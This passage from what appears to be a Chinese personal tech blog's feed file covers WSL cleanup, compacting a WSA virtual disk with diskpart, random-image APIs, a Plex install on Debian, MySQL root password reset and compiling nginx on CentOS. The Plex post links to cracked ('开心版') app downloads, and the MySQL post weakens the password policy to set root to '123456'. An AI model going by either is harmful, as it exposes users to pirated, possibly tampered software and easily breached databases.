class="function">ERROR: <span class="title">Wsl</span>/<span class="title">Service</span>/<span class="title">CreateInstance</span>/<span class="title">ERROR_FILE_NOT_FOUND</span></span></span><br></pre></td></tr></tbody></table></figure><p>打开命令行，在命令行中输入</p><figure class="highlight cmd"><figcaption><span>cmd</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wsl.exe --list --all</span><br><span class="line">wsl.exe --unregister xxx</span><br></pre></td></tr></tbody></table></figure><h1 id="摘抄"><a class="anchor" href="#摘抄">#</a> 摘抄</h1><p><a href="https://blog.csdn.net/zhys2007/article/details/110958577">WSL2 迁移方法</a><br><a href="https://blog.csdn.net/y17854117512/article/details/119214442?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1-119214442-blog-110900591.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1-119214442-blog-110900591.pc_relevant_default&amp;utm_relevant_index=1">解决 Win10 子系统的 Ubuntu 被删除后，重新安装出现找不到系统路径</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> wsl2 </tag>
            
            <tag> Hyper-v </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过diskpart工具压缩userdata.vhdx来解决磁盘占用过多问题</title>
      <link href="/ug/204350/"/>
      <url>/ug/204350/</url>
      
        <content type="html"><![CDATA[<h1 id="intro"><a class="anchor" href="#intro">#</a> Intro</h1><p>当你安装了 WSA 后随着你的使用，你会发现占用的空间越来越大。即使你把不需要的安卓程序卸载了之后，却依然满满的霸占着你的 C 盘。你只能眼睁睁地看他慢慢变大却无能为力。当然本篇文章的目的就是帮你解决这个问题。</p><h1 id="移动wsa到其他盘符"><a class="anchor" href="#移动wsa到其他盘符">#</a> 移动 WSA 到其他盘符</h1><blockquote><p>你利用你聪明的头脑打开了百度并使用灵巧的双手在搜索框里输入 WSA 磁盘空间过大。很快你便看到了一种解决方式.</p></blockquote><ol><li>打开设置 - 程序 - 已安装的程序，找到 WSA</li></ol><div class="tag-plugin image"><div class="image-bg"><img src="/img/Windowssubsystemforandroidcompression/20221118205416.png" fancybox="true"></div></div> <ol start="2"><li>点击后面三个点选择移动。<br>稍等一会就会帮你把 WSA 移动到对应的盘符了。</li></ol><h1 id="使用diskpart工具压缩"><a class="anchor" href="#使用diskpart工具压缩">#</a> 使用 diskpart 工具压缩</h1><ol><li>以管理员身份运行 cmd，输入 diskpart 命令按回车。</li><li>使用以下命令选择你的 userdata.vhdx</li></ol><figure class="highlight cmd"><figcaption><span>cmd</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select vdisk file = "D:\WpSystem\S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">3846526574</span>-<span class="number">1502088438</span>-<span class="number">2560978845</span>-<span class="number">1001</span>\AppData\Local\Packages\MicrosoftCorporationII.WindowsSubsystemForAndroid_8wekyb3d8bbwe\LocalCache\userdata.vhdx"</span><br></pre></td></tr></tbody></table></figure><p>如果提示</p><figure class="highlight cmd"><figcaption><span>cmd</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DiskPart successfully selected the virtual disk file.</span><br></pre></td></tr></tbody></table></figure><p>就说明成功了。</p><ol start="3"><li>输入  <code>compact vdisk</code>  来压缩。</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DiskPart has encountered an error: The specified file is encrypted and the user does not have the ability to decrypt it.</span><br><span class="line">See the System Event Log for more information.</span><br></pre></td></tr></tbody></table></figure><p>这个就说明你没有权限压缩这个文件。<br>为了解决这个问题我百度了一晚上，最后发现，只要你把这个文件复制走，就会提示</p><div class="tag-plugin image"><div class="image-bg"><img src="/img/Windowssubsystemforandroidcompression/20221118210314.png" fancybox="true"></div></div>  <p>这里选择是，然后就会复制走。<br>这个时候你再看你复制的文件就会发现上面的小黄锁已经不见了。</p><ol start="4"><li>重新选择 userdata.vhdx 文件</li></ol><figure class="highlight cmd"><figcaption><span>cmd</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select vdisk file = "D:\userdata.vhdx"</span><br></pre></td></tr></tbody></table></figure><ol start="5"><li>重新输入命令  <code>compact vdisk</code>  进行压缩，如果出现下面的提示那就说明压缩成功了。</li></ol><figure class="highlight cmd"><figcaption><span>cmd</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DISKPART&gt; <span class="built_in">compact</span> vdisk</span><br><span class="line"></span><br><span class="line">  <span class="number">100</span> percent completed</span><br><span class="line"></span><br><span class="line">DiskPart successfully compacted the virtual disk file.</span><br><span class="line"></span><br><span class="line">DISKPART&gt;</span><br></pre></td></tr></tbody></table></figure><p>此时再看你复制出来的文件，就会发现大小缩小了很多，压缩成功了。<br>接着只需要剪切拷贝出来的文件，替换掉原来的文件就可以了。</p><h1 id="成果"><a class="anchor" href="#成果">#</a> 成果</h1><p><strong>压缩前：</strong></p><blockquote><div class="tag-plugin image"><div class="image-bg"><img src="/img/Windowssubsystemforandroidcompression/20221118204548.png" fancybox="true"></div></div>  </blockquote><p><strong>压缩后：</strong></p><blockquote><div class="tag-plugin image"><div class="image-bg"><img src="/img/Windowssubsystemforandroidcompression/20221118210939.png" fancybox="true"></div></div>  </blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> wsa </tag>
            
            <tag> vhd </tag>
            
            <tag> vhdx </tag>
            
            <tag> diskpart </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随机图片API</title>
      <link href="/ug/152935/"/>
      <url>/ug/152935/</url>
      
        <content type="html"><![CDATA[<h1 id="随机图片api"><a class="anchor" href="#随机图片api">#</a> 随机图片 API</h1><blockquote><p>都有时效性，失效不管 233</p></blockquote><h2 id="二次元"><a class="anchor" href="#二次元">#</a> 二次元</h2><div class="tag-plugin image"><div class="image-bg"><img src="https://iw233.cn/API/Random.php" alt="https://iw233.cn/API/Random.php" fancybox="true"></div><div class="image-meta"><span class="image-caption center">https://iw233.cn/API/Random.php</span></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://api.paugram.com/wallpaper" alt="https://api.paugram.com/wallpaper" fancybox="true"></div><div class="image-meta"><span class="image-caption center">https://api.paugram.com/wallpaper</span></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://www.dmoe.cc/random.php" alt="https://www.dmoe.cc/random.php" fancybox="true"></div><div class="image-meta"><span class="image-caption center">https://www.dmoe.cc/random.php</span></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://api.mtyqx.cn/api/random.php" alt="https://api.mtyqx.cn/api/random.php" fancybox="true"></div><div class="image-meta"><span class="image-caption center">https://api.mtyqx.cn/api/random.php</span></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://api.yimian.xyz/img?type=moe" alt="https://api.yimian.xyz/img?type=moe" fancybox="true"></div><div class="image-meta"><span class="image-caption center">https://api.yimian.xyz/img?type=moe</span></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://api.ixiaowai.cn/api/api.php" alt="https://api.ixiaowai.cn/api/api.php" fancybox="true"></div><div class="image-meta"><span class="image-caption center">https://api.ixiaowai.cn/api/api.php</span></div></div><p class="gallery" data-height="480"></p><h2 id="三次元"><a class="anchor" href="#三次元">#</a> 三次元</h2><div class="tag-plugin image"><div class="image-bg"><img src="https://api.btstu.cn/sjbz/api.php" alt="https://api.btstu.cn/sjbz/api.php" fancybox="true"></div><div class="image-meta"><span class="image-caption center">https://api.btstu.cn/sjbz/api.php</span></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://api.paugram.com/bing/" alt="https://api.paugram.com/bing/ 必应每日壁纸" fancybox="true"></div><div class="image-meta"><span class="image-caption center">https://api.paugram.com/bing/ 必应每日壁纸</span></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://api.ixiaowai.cn/gqapi/gqapi.php" alt="https://api.ixiaowai.cn/gqapi/gqapi.php" fancybox="true"></div><div class="image-meta"><span class="image-caption center">https://api.ixiaowai.cn/gqapi/gqapi.php</span></div></div><p class="gallery" data-height="480"></p><h2 id="menhara酱"><a class="anchor" href="#menhara酱">#</a> menhara 酱</h2><div class="tag-plugin image"><div class="image-bg"><img src="https://api.ixiaowai.cn/mcapi/mcapi.php" alt="https://api.ixiaowai.cn/mcapi/mcapi.php" fancybox="true"></div><div class="image-meta"><span class="image-caption center">https://api.ixiaowai.cn/mcapi/mcapi.php</span></div></div><p class="gallery" data-height="480"></p><h2 id="eeedog"><a class="anchor" href="#eeedog">#</a> eeedog</h2><blockquote><p>这个有点复杂建议自己去看看<br><a href="https://www.eee.dog/tech/rand-pic-api.html"> eeedog</a> 我随意放一个随机图床</p></blockquote><div class="tag-plugin image"><div class="image-bg"><img src="https://api.yimian.xyz/img?type=imgbed" alt="https://api.yimian.xyz/img?type=imgbed" fancybox="true"></div><div class="image-meta"><span class="image-caption center">https://api.yimian.xyz/img?type=imgbed</span></div></div><p class="gallery" data-height="480"></p><hr><h1 id="本地"><a class="anchor" href="#本地">#</a> 本地</h1><div class="tag-plugin image"><div class="image-bg"><img src="/img/pictureshow/20221116154554.png" alt="女人" fancybox="true"></div><div class="image-meta"><span class="image-caption center">女人</span></div></div>  <div class="tag-plugin image"><div class="image-bg"><img src="/img/pictureshow/20221116154625.png" alt="女人" fancybox="true"></div><div class="image-meta"><span class="image-caption center">女人</span></div></div>  <div class="tag-plugin image"><div class="image-bg"><img src="/img/pictureshow/20221116154652.png" fancybox="true"></div></div>  <div class="tag-plugin image"><div class="image-bg"><img src="/img/pictureshow/20221116154713.png" fancybox="true"></div></div>  <div class="tag-plugin image"><div class="image-bg"><img src="/img/pictureshow/20221116154721.png" fancybox="true"></div></div>  <div class="tag-plugin image"><div class="image-bg"><img src="/img/pictureshow/20221116154729.png" fancybox="true"></div></div>  <div class="tag-plugin image"><div class="image-bg"><img src="/img/pictureshow/20221116154737.png" fancybox="true"></div></div>  <div class="tag-plugin image"><div class="image-bg"><img src="/img/pictureshow/20221116154746.png" fancybox="true"></div></div>  <div class="tag-plugin image"><div class="image-bg"><img src="/img/pictureshow/20221116154914.png" fancybox="true"></div></div>  <div class="tag-plugin image"><div class="image-bg"><img src="/img/pictureshow/20221116154922.png" fancybox="true"></div></div>  <div class="tag-plugin image"><div class="image-bg"><img src="/img/pictureshow/20221116154928.png" fancybox="true"></div></div>  <div class="tag-plugin image"><div class="image-bg"><img src="/img/pictureshow/20221116154935.png" fancybox="true"></div></div>  <div class="tag-plugin image"><div class="image-bg"><img src="/img/pictureshow/20221116154945.png" fancybox="true"></div></div>  <div class="tag-plugin image"><div class="image-bg"><img src="/img/pictureshow/20221116154953.png" fancybox="true"></div></div>  <div class="tag-plugin image"><div class="image-bg"><img src="/img/pictureshow/20221116155005.png" fancybox="true"></div></div>  <div class="tag-plugin image"><div class="image-bg"><img src="/img/pictureshow/20221116155015.png" fancybox="true"></div></div>  <div class="tag-plugin image"><div class="image-bg"><img src="/img/pictureshow/20221116155023.png" fancybox="true"></div></div>  <div class="tag-plugin image"><div class="image-bg"><img src="/img/pictureshow/20221116155031.png" fancybox="true"></div></div>  <p class="gallery"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pic </tag>
            
            <tag> img </tag>
            
            <tag> api </tag>
            
            <tag> random </tag>
            
            <tag> wallpaper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在Debian系linux上通过apt的方式安装plex媒体中心</title>
      <link href="/ug/204417/"/>
      <url>/ug/204417/</url>
      
        <content type="html"><![CDATA[<h1 id="intro"><a class="anchor" href="#intro">#</a> Intro</h1><p>plex 是一个包含订阅制的个人媒体中心，可以在你的智能设备：Phone / Android TV / Windows / MAC OS 等在线使用专用的客户端来浏览你存储在 nas 上的影片。</p><div class="tag-plugin image"><div class="image-bg"><img src="/img/linuxplexguide/20221102204637.png" fancybox="true"></div></div>  <p>如果你付费订阅则会支持更多的功能如在线硬解码 / 使用 dashboard 来控制设备 / 使用 plexamp 来播放音乐。当然免费的功能已经足够我们使用。</p><h1 id="安装"><a class="anchor" href="#安装">#</a> 安装</h1><ol><li>首先更新</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &amp;&amp; sudo apt upgrade</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>安装 apt-transport-https 包</li></ol><blockquote><p>要将 Plex 包安装到树莓派上，需要添加官方的 Plex 包仓库。这个包允许 “apt” 包管理器通过 Plex 仓库使用的 “https” 协议来检索包。</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install apt-transport-https</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>把 Plex 仓库添加到 apt 源</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl https://downloads.plex.tv/plex-keys/PlexSign.key | sudo apt-key add -</span><br><span class="line"><span class="built_in">echo</span> deb https://downloads.plex.tv/repo/deb public main | sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/plexmediaserver.list</span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>再次更新</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></tbody></table></figure><ol start="5"><li>一行命令安装 Plex</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install plexmediaserver</span><br></pre></td></tr></tbody></table></figure><h1 id="使用plex"><a class="anchor" href="#使用plex">#</a> 使用 Plex</h1><p>打开  <code>Your IP:32400/web</code>  来登录并配置你自己的 Plex 服务器</p><h2 id="在安卓设备上安装plex和plexamp软件"><a class="anchor" href="#在安卓设备上安装plex和plexamp软件">#</a> 在安卓设备上安装 plex 和 plexamp 软件。</h2><blockquote><p>不保证时效性，若失效请自行查找。</p></blockquote><ul><li>plex 软件开心版<a href="https://apkmody.io/apps/plex">点我下载</a></li></ul><div class="tag-plugin image"><div class="image-bg"><img src="/img/linuxplexguide/image.png.png" fancybox="true"></div></div>  <ul><li>plexamp 软件开心版<a href="https://forum.mobilism.me/viewtopic.php?f=1332&amp;t=4970093">点我下载</a></li></ul><div class="tag-plugin image"><div class="image-bg"><img src="/img/linuxplexguide/20221102210820.png" fancybox="true"></div></div>  <ul><li>symfonium 这个没开心版，但是界面好看。</li></ul><div class="tag-plugin image"><div class="image-bg"><img src="/img/linuxplexguide/20221102210737.png" fancybox="true"></div></div> <div class="tag-plugin image"><div class="image-bg"><img src="/img/linuxplexguide/20221102210803.png" fancybox="true"></div></div>  <h2 id="安装wangyiyun插件来自动匹配音乐封面和歌词"><a class="anchor" href="#安装wangyiyun插件来自动匹配音乐封面和歌词">#</a> 安装 Wangyiyun 插件来自动匹配音乐封面和歌词。</h2><ol><li>使用 git clone 下载。</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo git <span class="built_in">clone</span> https://github.com/timmy0209/WangYiYun.bundle.git /usr/lib/plexmediaserver/Resources/Plug-ins-f4cdfea9c/WangYiYun.bundle</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>重启 plex</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart plexmediaserver</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>直接在音乐源里勾选 wangyiyun 即可。</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> media center </tag>
            
            <tag> plex </tag>
            
            <tag> emby </tag>
            
            <tag> jellyfin </tag>
            
            <tag> 视频 </tag>
            
            <tag> 音乐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决mysql第一次安装后改密码的各种问题</title>
      <link href="/ug/101622/"/>
      <url>/ug/101622/</url>
      
        <content type="html"><![CDATA[<h1 id="如何重置mysql密码"><a class="anchor" href="#如何重置mysql密码">#</a> 如何重置 mysql 密码？</h1><p>按照提示，alter user。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER <span class="string">'root'</span>@<span class="string">'localhost'</span> IDENTIFIED BY <span class="string">'123456'</span>;</span><br></pre></td></tr></tbody></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="/img/WebBackcreat1/20221019100609.png" fancybox="true"></div></div>  <p>哈哈快乐报错。</p><p>更改密码复杂度。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> global validate_password_policy=0;</span><br><span class="line"><span class="built_in">set</span> global validate_password_length=1;</span><br></pre></td></tr></tbody></table></figure><p>提示：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1193 (HY000): Unknown system variable <span class="string">'validate_password_policy'</span></span><br></pre></td></tr></tbody></table></figure><p>很快乐。</p><p>那就先查看密码规范：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE <span class="string">'validate_password%'</span>;</span><br></pre></td></tr></tbody></table></figure><p>提示：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1820 (HY000): You must reset your password using ALTER USER statement before executing this statement.</span><br></pre></td></tr></tbody></table></figure><p>套娃呢是吧。</p><p>解决方法：<br>重置一个和随机密码差不多的就可以了：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER <span class="string">'root'</span>@<span class="string">'localhost'</span> IDENTIFIED BY <span class="string">'qazWsx&gt;+&amp;3ed'</span>;</span><br></pre></td></tr></tbody></table></figure><p>已经提示成功了：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; ALTER USER <span class="string">'root'</span>@<span class="string">'localhost'</span> IDENTIFIED BY <span class="string">'qazWsx&gt;+&amp;3ed'</span>;</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br></pre></td></tr></tbody></table></figure><p>更改密码复杂度：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> global validate_password.policy=0;</span><br><span class="line"><span class="built_in">set</span> global validate_password.length=6;</span><br></pre></td></tr></tbody></table></figure><p>修改密码并退出：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER <span class="string">'root'</span>@<span class="string">'localhost'</span> IDENTIFIED BY <span class="string">'123456'</span>;</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></tbody></table></figure><p>然后就可以愉快重启登陆了：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart mysqld</span><br><span class="line">mysql -u root -p</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> mysql </tag>
            
            <tag> passwd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在centos中部署后端程序。</title>
      <link href="/ug/211932/"/>
      <url>/ug/211932/</url>
      
        <content type="html"><![CDATA[<h1 id="intro"><a class="anchor" href="#intro">#</a> Intro</h1><p>LAMP 和 LNMP 都是用于搭建 Web 服务器环境的软件栈，其中 LAMP 是使用 Linux 操作系统、Apache Web 服务器、MySQL 数据库和 PHP 编程语言，而 LNMP 则是使用 Linux 操作系统、Nginx Web 服务器、MySQL 数据库和 PHP 编程语言。当然也有组合使用的 LNMPA、LAMN、LEMP 等，关于这些我只谈谈 LNMPA。</p><h2 id="都是啥东西"><a class="anchor" href="#都是啥东西">#</a> 都是啥东西？</h2><ul><li>L 是指 Linux 操作系统：LAMP 中的 L 指的是 Linux 操作系统，通常使用 Ubuntu、Debian、CentOS 等常见的 Linux 发行版。</li><li>A 是指 Apache Web 服务器：Apache 是一个流行的开源 Web 服务器软件，它支持多种操作系统和编程语言，包括 PHP、Perl、Python 等。</li><li>N 是指 Nginx Web 服务器：Nginx 是另一种流行的开源 Web 服务器软件，它与 Apache 相比更轻量级、更高效，并且支持更多的并发连接。</li><li>M 是指 MySQL 数据库：MySQL 是一个流行的关系型数据库管理系统，它支持多种操作系统和编程语言，包括 PHP、Java、Python 等。</li><li>P 是指 PHP 编程语言：PHP 是一种流行的 Web 编程语言，它可以在服务器端生成动态网页内容，与 MySQL 数据库和 Apache Web 服务器紧密集成。</li></ul><p>总的来说，LAMP 和 LNMP 的最大区别在于 Web 服务器组件的选择。对于需要处理大量并发连接的 Web 应用程序，LNMP 中的 Nginx 服务器通常比 Apache 性能更好。而对于一些较小的 Web 应用程序，使用 LAMP 也是一种不错的选择。</p><h2 id="lnmpa"><a class="anchor" href="#lnmpa">#</a> LNMPA</h2><p>LNMPA 同样是由上述的软件组成的。LNMPA 的特点是同时支持 Nginx 和 Apache 两种 Web 服务器，可以灵活地根据实际需求进行选择使用。具体的区别在于 LNMPA 中的 N 和 A 的作用。</p><ul><li>Nginx Web 服务器：Nginx 是 LNMPA 中的主要 Web 服务器，它提供高性能的反向代理和负载均衡功能，可以有效地处理大量并发请求。</li><li>Apache Web 服务器：Apache 是 LNMPA 中的备用 Web 服务器，当需要使用一些只支持 Apache 的模块或应用程序时可以切换到 Apache。</li></ul><p>与 LNMP 相比，LNMPA 的主要优点是可以同时支持 Nginx 和 Apache 两种 Web 服务器，从而更好地适应各种 Web 应用程序的需求。同时，LNMPA 还可以通过配置文件灵活地选择使用哪种 Web 服务器，并且可以在不重启服务的情况下切换服务器，提高了系统的可用性和灵活性。</p><h2 id="其他"><a class="anchor" href="#其他">#</a> 其他</h2><p>是否有 LAMPN 这种组合呢？</p><p>LAMPN 并不是一个常见的 Web 服务器软件栈，通常情况下不会使用它来搭建 Web 服务器环境。不过，如果你指的是在 LAMP 中加入 Nginx Web 服务器，也就是使用 Linux 操作系统、Apache Web 服务器、MySQL 数据库和 Nginx Web 服务器，那么这个组合通常被称为 LAMN 或 LEMP。</p><p>这里不做详细赘述。</p><hr><h1 id="环境搭建"><a class="anchor" href="#环境搭建">#</a> 环境搭建</h1><blockquote><p>其实部署很简单，重要的地方在于部署时出现差错后该如何进行处理。</p></blockquote><h2 id="简单使用"><a class="anchor" href="#简单使用">#</a> 简单使用</h2><blockquote><p>使用 apt 或者 yum 安装的方式太过简单所以不做详细描述。我只放出命令提供复制使用。</p></blockquote><p>安装 Nginx：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install nginx</span><br></pre></td></tr></tbody></table></figure><p>安装 Apache：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install httpd</span><br></pre></td></tr></tbody></table></figure><p>安装 PHP：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install php</span><br></pre></td></tr></tbody></table></figure><p>以上命令将会安装最新版本的软件包。如果需要安装特定版本的软件，可以在命令后面加上软件包的版本号，例如：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install nginx-1.20.1</span><br><span class="line">yum install httpd-2.4.46</span><br><span class="line">yum install php-7.4.24</span><br></pre></td></tr></tbody></table></figure><p>安装完成后，启动服务并设置开机自启：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start nginx/httpd/php-fpm   <span class="comment"># 启动服务</span></span><br><span class="line">systemctl <span class="built_in">enable</span> nginx/httpd/php-fpm  <span class="comment"># 设置开机自启</span></span><br></pre></td></tr></tbody></table></figure><h2 id="nginx的安装"><a class="anchor" href="#nginx的安装">#</a> Nginx 的安装</h2><h3 id="使用源码编译安装"><a class="anchor" href="#使用源码编译安装">#</a> 使用源码编译安装：</h3><ol><li>访问<a href="https://nginx.org/en/download.html"> Nginx</a> 官网，复制最新版本链接。wget 到本地目录。</li></ol><blockquote><div class="tag-plugin image"><div class="image-bg"><img src="./img/WebBackcreat1/20221016212408.png" fancybox="true"></div></div> &nbsp;</blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">wget https://nginx.org/download/nginx-1.23.1.tar.gz ~/</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>解压出来。</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf nginx-1.23.1.tar.gz</span><br><span class="line">// 如果这里是 *.tar.bz2 的话则使用 -jxvf</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>更新并安装编译所需要的前置。（PS：请使用 root 用户）</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum update &amp;&amp; yum -y upgrade</span><br><span class="line">yum -y install gcc make gcc-c++ zlib zlib-devel pcre-devel openssl openssl-devel expat-devel</span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>进入解压出来的文件夹，编译安装。</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> nginx-1.23.1</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></tbody></table></figure><ol start="5"><li>nginx 的启动和关闭</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/local/nginx/sbin</span><br><span class="line">// 启动nginx</span><br><span class="line">./nginx</span><br><span class="line">// 关闭nginx</span><br><span class="line">./nginx -s stop</span><br></pre></td></tr></tbody></table></figure><ol start="6"><li>创建目录</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /var/temp/nginx -p</span><br></pre></td></tr></tbody></table></figure><blockquote><p>建议在执行前先使用 netstat -aux | grep 80 查看是否有端口占用 80。</p></blockquote><h3 id="写systemd实现开机自启"><a class="anchor" href="#写systemd实现开机自启">#</a> 写 Systemd 实现开机自启</h3><ol><li>编辑文件</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /lib/systemd/system/</span><br><span class="line">vim nginx.service</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>添加内容</li></ol><figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=The NGINX HTTP <span class="built_in">and</span> <span class="built_in">reverse</span> proxy server</span><br><span class="line">After=syslog.target network.target remote-fs.target nss-lookup.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">PIDFile=/usr/local/nginx/logs/nginx.pid</span><br><span class="line">ExecStartPre=/usr/local/nginx/sbin/nginx -t -<span class="keyword">c</span> /usr/local/nginx/<span class="keyword">conf</span>/nginx.<span class="keyword">conf</span></span><br><span class="line">ExecStart=/usr/local/nginx/sbin/nginx -<span class="keyword">c</span> /usr/local/nginx/<span class="keyword">conf</span>/nginx.<span class="keyword">conf</span></span><br><span class="line">ExecReload=/usr/local/nginx/sbin/nginx -s reload</span><br><span class="line">KillStop=/usr/local/nginx/sbin/nginx -s <span class="keyword">stop</span></span><br><span class="line">ExecStop=/usr/local/nginx/sbin/nginx 